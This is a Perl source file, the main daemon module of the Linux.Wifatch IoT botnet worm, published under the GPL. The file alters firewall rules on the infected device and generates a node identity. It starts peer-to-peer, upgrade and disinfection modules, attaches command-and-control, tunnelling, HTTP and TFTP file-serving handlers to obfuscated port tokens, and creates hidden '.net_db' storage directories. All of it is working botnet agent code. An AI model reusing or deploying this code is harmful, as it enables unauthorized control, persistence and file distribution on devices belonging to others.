#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bn::run;

# main daemon code

use bn::iptables;

BEGIN {
	bn::log "RUN init dns";
	require bn::dns;

	bn::log "RUN init ntp";
	require bn::ntp;

	bn::log "RUN init watchdog";
	require bn::watchdog;
}

use bn::net;
use bn::port;
use bn::hpv;
use bn::fileclient;
use bn::xx;
use bn::disinfect;

bn::log "RUN init";

# we need lo, and it often missing
# does NOT set up route
system "ifconfig lo 127.0.0.1 up";

bn::iptables::reject_port tcp => $_ for 23, 32764;    # telnet, sercom backdoor
bn::iptables::accept_port tcp => $_ for 989 .. 995, 58454;    # tn

$bn::UPTME = bn::ntp::now;

unless (exists $bn::cfg{secret}) {
	bn::log "RUN newid";
	bn::crypto::random_init;

	$bn::cfg{id}     = bn::crypto::rand_bytes 32;
	$bn::cfg{secret} = bn::crypto::rand_bytes 256;
	$bn::cfg{idtime} = int AE::now;

	bn::cfg::save 1;
}

$Coro::POOL_SIZE = 0;
$bn::LOW_MEMORY  = 1;

if ($bn::SAFE_MODE) {
	$bn::log::max_log = 10;

	$bn::hpv::na = 5;
	$bn::hpv::nb = 5;
	$bn::hpv::np = 60;

} elsif (bn::func::free_mem < 20000) {
	$bn::log::max_log = 100;

	$bn::hpv::na = 5;
	$bn::hpv::nb = 8;
	$bn::hpv::np = 90;

} else {
	$Coro::POOL_SIZE  = 8;
	$bn::LOW_MEMORY   = 0;
	$bn::log::max_log = 900;

	$bn::hpv::na = 8;
	$bn::hpv::nb = 16;
	$bn::hpv::np = 800;
}

bn::log "RUN upgrade";
eval {require bn::upgrade;};
bn::log "ERROR upgrade: $@" if $@;

bn::log "RUN net";
bn::net::init;

bn::log "RUN port";
bn::port::run;

bn::event::automod port_connect_iaN8xie8   => bn::ccport     => "ccport";
bn::event::automod port_connect_ZiaJ9oqv   => bn::tcplex     => "tcplex";
bn::event::automod port_connect_OhKa8eel   => bn::fileserver => "fileserver";
bn::event::automod "port_connect_GET /bn/" => bn::fileserver => "httpd";
bn::event::automod port_packet             => bn::fileserver => "tftpd";

bn::log "RUN hpv";
bn::hpv::init;

#unless ($bn::SAFE_MODE) {
bn::log "RUN xx";
bn::xx::init;

bn::log "RUN disinfect";
bn::disinfect::init;

#}

####################################################################################
++$bn::cfg{cnt_start};

use bn::auto sub => <<'END';
eval speedtest;
return if $bn::cfg{speedtest};

bn::func::async {
	return unless $bn::SEMSET->count("speedtest");
	my $guard = $bn::SEMSET->guard("speedtest");

	bn::log "attempting speedtest";
	Coro::AnyEvent::sleep 60;

	#      my $mem = bn::func::get_mem 2, 3600
	#         or return;

	bn::log "running speedtest";
	(bn::func::fork_rpc "bn::speedtest", "test")->(
		sub {
			$bn::cfg{speedtest} = [int bn::ntp::now, @_];
			bn::cfg::save 1;

			#            undef $mem;
		});
};

END

if ($bn::SAFE_MODE) {

	# broadcast safemode
	bn::log "ERROR safemode ($::SAFE_MODE, $::SAFE_STATUS)";
} else {

	# start services

	bn::log "RUN services";
	bn::func::async {
		unless ($bn::LOW_MEMORY) {
			if (open my $mtab, "/proc/mounts") {
				my $free = 0;

				while (<$mtab>) {
					my (undef, $mount, $type, $flags) =
						split / /;

					next unless $flags =~ /\brw\b/;

					if (-d "$mount/.net_db") {
						$bn::DBDIR = "$mount/.net_db";
					}

					next
						unless $type =~
						/^(ext[234]|jfs|ntfs|ufsd|reiserfs|vfat|xfs)$/;
					my ( $bsize, undef, $blocks, $bfree,
					     undef,  undef, undef,   undef,
					     undef,  undef
						)
						= Filesys::Statvfs::statvfs $mount
						or next;

					if (     $bsize * $blocks > 500e6
					     and $bsize * $bfree > $free) {
						$free      = $bsize * $bfree;
						$bn::DBDIR = "$mount/.net_db";
					}
				}

				if ($bn::DBDIR) {
					mkdir $bn::DBDIR, 0700;
					require bn::db;
					require bn::storage;
				}
			}

		}

		speedtest;
	}

}

####################################################################################
bn::log "RUN save";
bn::cfg::save;

$::DEBUG and system "ps v $$";

bn::log "RUN done";

1

